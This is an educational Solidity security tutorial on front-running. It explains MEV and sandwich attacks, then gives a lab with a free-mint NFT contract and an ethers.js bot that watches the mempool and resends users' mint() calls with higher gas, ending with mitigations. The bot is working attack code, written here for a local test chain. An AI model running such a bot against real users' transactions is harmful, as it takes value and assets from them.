---
title: S11. Front-running
tags:
    - solidity
    - security
    - erc721
---

# WTF Solidity S11. Front-running

Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies. 

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Community: [Discord](https://discord.gg/5akcruXrsk)｜[Wechat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Website wtf.academy](https://wtf.academy)

Codes and tutorials are open source on GitHub: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

English translations by: [@to_22X](https://twitter.com/to_22X)

---

In this lesson, we will introduce front-running in smart contracts. According to statistics, arbitrageurs on Ethereum have made $1.2 billion through sandwich attacks.

## Front-running

### Traditional Front-running
Front-running originated in traditional financial markets as a purely profit-driven competition. In financial markets, information asymmetry gave rise to financial intermediaries who could profit by being the first to know certain industry information and react to it. These attacks primarily occurred in stock market trading and early domain name registrations.

In September 2021, Nate Chastain, the product lead of the NFT marketplace OpenSea, was found to profit by front-running the purchase of NFTs that would be featured on the OpenSea homepage. He used insider information to gain an unfair information advantage, buying the NFTs before they were showcased on the homepage and then selling them after they appeared. However, someone discovered this illegal activity by matching the timestamp of the NFT transactions with the problematic NFTs promoted on the OpenSea homepage, and Nate was taken to court.

Another example of traditional front-running is insider trading in tokens before they are listed on well-known exchanges like [Binance](https://www.wsj.com/articles/crypto-might-have-an-insider-trading-problem-11653084398?mod=hp_lista_pos4) or [Coinbase](https://www.protocol.com/fintech/coinbase-crypto-insider-trading). Traders with insider information buy in advance, and when the listing announcement is made, the token price significantly increases, allowing the front-runners to sell for a profit.

### On-chain Front-running

On-chain front-running refers to searchers or miners inserting their own transactions ahead of others by increasing gas or using other methods to capture value. In blockchain, miners can profit by packaging, excluding, or reordering transactions in the blocks they generate, and MEV is the measure of this profit.

Before a user's transaction is included in the Ethereum blockchain by miners, most transactions gather in the Mempool, where miners look for high-fee transactions to prioritize for block inclusion and maximize their profits. Generally, transactions with higher gas prices are more likely to be included. Additionally, some MEV bots search for profitable transactions in the Mempool. For example, a swap transaction with a high slippage setting in a decentralized exchange may be subject to a sandwich attack: an arbitrageur inserts a buy order before the transaction and a sell order after, profiting from it. This effectively inflates the market price.

![](./img/S11-1.png)

## Front-running in Practice

If you learn front-running, you can consider yourself an entry-level crypto scientist. Next, let's practice front-running a transaction for minting an NFT. The tools we will use are:
- `Foundry`'s `anvil` tool to set up a local test chain. Please install [foundry](https://book.getfoundry.sh/getting-started/installation) in advance.
- `Remix` for deploying and minting the NFT contract.
- `etherjs` script to listen to the Mempool and perform front-running.

**1. Start the Foundry Local Test Chain:** After installing `foundry`, enter `anvil --chain-id 1234 -b 10` in the command line to set up a local test chain with a chain ID of 1234 and a block produced every 10 seconds. Once set up, it will display the addresses and private keys of some test accounts, each with 10000 ETH. You can use them for testing.

![](./img/S11-2.png)

**2. Connect Remix to the Test Chain:** Open the deployment page in Remix, open the `Environment` dropdown menu in the top left corner, and select `Foundry Provider` to connect Remix to the test chain.

![](./img/S11-3.png)

**3. Deploy the NFT Contract:** Deploy a simple freemint NFT contract on Remix. It has a `mint()` function for free NFT minting.

```solidity
// SPDX-License-Identifier: MIT
// By 0xAA
// english translation by 22X
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// We attempt to frontrun a Free mint transaction
contract FreeMint is ERC721 {
    uint256 totalSupply;

    // Constructor, initializes the name and symbol of the NFT collection
    constructor() ERC721("Free Mint NFT", "FreeMint"){}

    // Mint function
    function mint() external {
        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}
```

**4. Deploy the ethers.js front-running script:** In simple terms, the `frontrun.js` script listens to pending transactions in the test chain's mempool, filters out transactions that call `mint()`, and then duplicates and increases the gas to front-run them. If you are not familiar with `ether.js`, you can read the [WTF Ethers](https://github.com/WTFAcademy/WTF-Ethers) tutorial.

```js
// provider.on("pending", listener)
import { ethers, utils } from "ethers";

// 1. Create provider
var url = "http://127.0.0.1:8545";
const provider = new ethers.providers.WebSocketProvider(url);
let network = provider.getNetwork();
network.then(res =>
  console.log(
    `[${new Date().toLocaleTimeString()}] Connected to chain ID ${res.chainId}`,
  ),
);

// 2. Create interface object for decoding transaction details.
const iface = new utils.Interface(["function mint() external"]);

// 3. Create wallet for sending frontrun transactions.
const privateKey =
  "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const wallet = new ethers.Wallet(privateKey, provider);

const main = async () => {
  // 4. Listen for pending mint transactions, get transaction details, and decode them.
  console.log("\n4. Listen for pending transactions, get txHash, and output transaction details.");
  provider.on("pending", async txHash => {
    if (txHash) {
      // Get transaction details
      let tx = await provider.getTransaction(txHash);
      if (tx) {
        // Filter pendingTx.data
        if (
          tx.data.indexOf(iface.getSighash("mint")) !== -1 &&
          tx.from != wallet.address
        ) {
          // Print txHash
          console.log(
            `\n[${new Date().toLocaleTimeString()}] Listening to Pending transaction: ${txHash} \r`,
          );

          // Print decoded transaction details
          let parsedTx = iface.parseTransaction(tx);
          console.log("Decoded pending transaction details:");
          console.log(parsedTx);
          // Decode input data
          console.log("Raw transaction:");
          console.log(tx);

          // Build frontrun tx
          const txFrontrun = {
            to: tx.to,
            value: tx.value,
            maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 1.2,
            maxFeePerGas: tx.maxFeePerGas * 1.2,
            gasLimit: tx.gasLimit * 2,
            data: tx.data,
          };
          // Send frontrun transaction
          var txResponse = await wallet.sendTransaction(txFrontrun);
          console.log(`Sending frontrun transaction`);
          await txResponse.wait();
          console.log(`Frontrun transaction successful`);
        }
      }
    }
  });

  provider._websocket.on("error", async () => {
    console.log(`Unable to connect to ${ep.subdomain} retrying in 3s...`);
    setTimeout(init, 3000);
  });

  provider._websocket.on("close", async code => {
    console.log(
      `Connection lost with code ${code}! Attempting reconnect in 3s...`,
    );
    provider._websocket.terminate();
    setTimeout(init, 3000);
  });
};

main();
```

**5. Call the `mint()` function:** Call the `mint()` function of the Freemint contract on the deployment page of Remix to mint an NFT.

**6. Script detects and frontruns the transaction:** We can see in the terminal that the `frontrun.js` script successfully detects the transaction and frontruns it. If you call the `ownerOf()` function of the NFT contract to check the owner of `tokenId` 0, and it matches the wallet address in the frontrun script, it proves that the frontrun was successful!.
![](./img/S11-4.png)

## How to Prevent

Frontrunning is a common issue on Ethereum and other public blockchains. While we cannot eliminate it entirely, we can reduce the profitability of frontrunning by minimizing the importance of transaction order or time:

- Use a commit-reveal scheme.
- Use dark pools, where user transactions bypass the public mempool and go directly to miners. Examples include flashbots and TaiChi.

## Summary

In this lesson, we introduced frontrunning on Ethereum, also known as a frontrun. This attack pattern, originating from the traditional finance industry, is easier to execute in blockchain because all transaction information is public. We performed a frontrun on a specific transaction: frontrunning a transaction to mint an NFT. When similar transactions are needed, it is best to support hidden mempools or implement measures such as batch auctions to limit frontrunning. Frontrunning is a common issue on Ethereum and other public blockchains, and while we cannot eliminate it entirely, we can reduce the profitability of frontrunning by minimizing the importance of transaction order or time.
